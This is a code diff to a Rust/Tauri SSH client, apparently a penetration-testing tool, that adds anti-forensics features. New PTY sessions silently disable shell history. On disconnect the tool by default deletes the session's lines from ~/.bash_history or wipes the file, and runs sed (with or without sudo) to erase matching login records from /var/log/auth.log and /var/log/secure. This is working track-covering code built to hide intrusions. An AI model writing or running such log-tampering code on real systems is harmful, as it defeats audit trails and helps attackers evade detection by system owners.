@@ -1,5 +1,6 @@
 use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
 use base64::Engine as _;
+use chrono;
 use mysql::prelude::*;
 use mysql::{OptsBuilder, Pool, PoolConstraints, PoolOpts};
 use serde::{Deserialize, Serialize};
@@ -59,6 +60,8 @@ struct SessionInfo {
     user: String,
     pass: Option<String>,
     note: String,
+    initial_history_count: Option<usize>, // 记录登录时的历史行数
+    connect_timestamp: String, // 记录连接时间戳，用于精确清理日志
 }
 
 struct AppState {
@@ -668,8 +671,21 @@ fn connect_ssh(
     channel.wait_close().map_err(|e| e.to_string())?;
     let initial_cwd = s.trim().to_string();
 
+    // 获取当前 bash_history 的行数（用于后续只删除新增的）
+    let initial_history_count = {
+        let mut channel = sess.channel_session().map_err(|e| e.to_string())?;
+        channel.exec("wc -l < ~/.bash_history 2>/dev/null || echo 0").map_err(|e| e.to_string())?;
+        let mut count_str = String::new();
+        channel.read_to_string(&mut count_str).map_err(|e| e.to_string())?;
+        channel.wait_close().map_err(|e| e.to_string())?;
+        count_str.trim().parse::<usize>().ok()
+    };
+
     // Generate unique session ID
     let session_id = Uuid::new_v4().to_string();
+
+    // 记录连接时间戳（用于后续精确清理日志）
+    let connect_timestamp = chrono::Local::now().format("%b %d %H:%M").to_string();
 
     // Create session info
     let session_info = SessionInfo {
@@ -680,6 +696,8 @@ fn connect_ssh(
         user: user.clone(),
         pass: pass.clone(),
         note: String::new(),
+        initial_history_count,
+        connect_timestamp,
     };
 
     // Store session wrapped in Arc<Mutex>
@@ -804,6 +822,7 @@ async fn upload_pentest_tool(
 fn disconnect_ssh(
     state: State<'_, AppState>,
     session_id: Option<String>,
+    auto_cleanup: Option<bool>,
 ) -> Result<String, String> {
     let id_to_disconnect = match session_id {
         Some(id) => Some(id),
@@ -811,6 +830,18 @@ fn disconnect_ssh(
     };
 
     if let Some(id) = id_to_disconnect {
+        // 在断开前，如果启用自动清理，先清理痕迹
+        if auto_cleanup.unwrap_or(true) {
+            // 尝试清理（失败不影响断开连接）
+            let _ = tauri::async_runtime::block_on(async {
+                // 清理本次登录后新增的 bash 历史
+                let _ = cleanup_current_user_history(state.clone(), id.clone()).await;
+                
+                // 清理本次连接的 SSH 日志
+                let _ = cleanup_ssh_log_for_user(state.clone(), id.clone()).await;
+            });
+        }
+
         let mut removed = false;
         let mut next_current: Option<String> = None;
         {
@@ -1001,8 +1032,22 @@ fn reconnect_ssh_session(session_info: &mut SessionInfo, timeout: u32) -> Result
     }
 
     sess.set_timeout(timeout);
+    
+    // 重新获取历史行数
+    let initial_history_count = {
+        let mut channel = sess.channel_session().map_err(|e| e.to_string())?;
+        channel.exec("wc -l < ~/.bash_history 2>/dev/null || echo 0").map_err(|e| e.to_string())?;
+        let mut count_str = String::new();
+        channel.read_to_string(&mut count_str).map_err(|e| e.to_string())?;
+        channel.wait_close().map_err(|e| e.to_string())?;
+        count_str.trim().parse::<usize>().ok()
+    };
+    
     session_info.session = sess;
     session_info.cwd = "/".to_string();
+    session_info.initial_history_count = initial_history_count;
+    session_info.connect_timestamp = chrono::Local::now().format("%b %d %H:%M").to_string();
+    
     Ok(())
 }
 
@@ -1275,6 +1320,12 @@ fn start_pty_session(
         .request_pty("xterm-256color", None, Some((cols, rows, 0, 0)))
         .map_err(|e| e.to_string())?;
     channel.shell().map_err(|e| e.to_string())?;
+
+    // 自动禁用当前会话的历史记录（不影响已有的 .bash_history）
+    // 使用 HISTFILE=/dev/null 将历史写入到 /dev/null，而不是删除原有文件
+    let disable_history_cmd = "unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0\n";
+    channel.write_all(disable_history_cmd.as_bytes()).map_err(|e| e.to_string())?;
+    channel.flush().map_err(|e| e.to_string())?;
 
     let pty_id = Uuid::new_v4().to_string();
     let pty_id_clone = pty_id.clone();
@@ -1709,6 +1760,104 @@ async fn exec_local_command(cmd: String) -> Result<String, String> {
     .map_err(|e| e.to_string())?
 }
 
+#[tauri::command]
+async fn cleanup_ssh_log_for_user(
+    state: State<'_, AppState>,
+    session_id: String,
+) -> Result<String, String> {
+    ensure_license_valid()?;
+    
+    let session_arc = {
+        let sessions = state.sessions.lock().unwrap();
+        sessions
+            .get(&session_id)
+            .cloned()
+            .ok_or(format!("Session {} not found", session_id))?
+    };
+
+    tauri::async_runtime::spawn_blocking(move || {
+        let session_info = session_arc.lock().unwrap();
+        let user = &session_info.user;
+        let ip = &session_info.ip;
+        let timestamp = &session_info.connect_timestamp;
+        
+        // 只清理本次连接的日志记录
+        // 使用时间戳 + 用户名 + IP 进行精确匹配
+        // 例如：Mar 24 10:30:15 ... sshd[12345]: Accepted password for root from 192.168.1.100
+        let cleanup_cmd = format!(
+            "sudo sed -i '/{}.*{}.*{}/d' /var/log/auth.log 2>/dev/null; sudo sed -i '/{}.*{}.*{}/d' /var/log/secure 2>/dev/null",
+            timestamp, user, ip, timestamp, user, ip
+        );
+        
+        drop(session_info);
+        let mut session_info_mut = session_arc.lock().unwrap();
+        let result = execute_single_command(&mut session_info_mut, &cleanup_cmd, 10000)?;
+        
+        if result.exit_code != 0 && !result.stderr.is_empty() {
+            // sudo 失败可能是权限问题，尝试不用 sudo
+            let cleanup_cmd_no_sudo = format!(
+                "sed -i '/{}.*{}.*{}/d' /var/log/auth.log 2>/dev/null; sed -i '/{}.*{}.*{}/d' /var/log/secure 2>/dev/null",
+                timestamp, user, ip, timestamp, user, ip
+            );
+            let result2 = execute_single_command(&mut session_info_mut, &cleanup_cmd_no_sudo, 10000)?;
+            if result2.exit_code != 0 {
+                return Err(format!("清理失败（需要 root 权限）: {}", result.stderr));
+            }
+        }
+        
+        Ok(format!("已清理用户 {} 从 {} 在 {} 的连接日志", user, ip, timestamp))
+    })
+    .await
+    .map_err(|e| e.to_string())?
+}
+
+#[tauri::command]
+async fn cleanup_current_user_history(
+    state: State<'_, AppState>,
+    session_id: String,
+) -> Result<String, String> {
+    ensure_license_valid()?;
+    
+    let session_arc = {
+        let sessions = state.sessions.lock().unwrap();
+        sessions
+            .get(&session_id)
+            .cloned()
+            .ok_or(format!("Session {} not found", session_id))?
+    };
+
+    tauri::async_runtime::spawn_blocking(move || {
+        let session_info = session_arc.lock().unwrap();
+        let initial_count = session_info.initial_history_count;
+        
+        // 如果记录了初始行数，只删除新增的行
+        let cleanup_cmd = if let Some(count) = initial_count {
+            // 方案：使用 sed 只保留前 N 行
+            format!(
+                "sed -i '{},$d' ~/.bash_history 2>/dev/null; history -c; history -r",
+                count + 1
+            )
+        } else {
+            // 如果没有记录初始行数（旧会话），清空所有
+            "history -c; rm -f ~/.bash_history; touch ~/.bash_history".to_string()
+        };
+        
+        // 需要重新获取可变引用
+        drop(session_info);
+        let mut session_info_mut = session_arc.lock().unwrap();
+        let result = execute_single_command(&mut session_info_mut, &cleanup_cmd, 10000)?;
+        
+        if result.exit_code != 0 && !result.stderr.is_empty() {
+            return Err(format!("清理失败: {}", result.stderr));
+        }
+        
+        Ok(format!("已清理本次登录后的 {} 条新增历史记录", 
+            initial_count.map(|c| format!("约 {}", c)).unwrap_or_else(|| "所有".to_string())))
+    })
+    .await
+    .map_err(|e| e.to_string())?
+}
+
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     println!("Tauri App Starting...");
@@ -1755,7 +1904,9 @@ pub fn run() {
             sftp_read,
             sftp_read_binary,
             sftp_write_binary,
-            sftp_delete
+            sftp_delete,
+            cleanup_ssh_log_for_user,
+            cleanup_current_user_history
         ))
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
